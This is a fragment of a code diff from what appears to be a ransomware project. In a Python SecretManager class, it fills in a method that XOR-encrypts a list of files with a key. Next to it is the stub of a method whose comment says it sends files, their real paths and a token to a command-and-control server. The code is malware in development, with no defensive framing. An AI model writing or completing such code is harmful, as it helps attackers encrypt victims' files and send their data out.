@@ -113,7 +113,8 @@ class SecretManager:
 
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
-        raise NotImplemented()
+        for f_path in files:
+            xorfile(f_path,self._key)
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
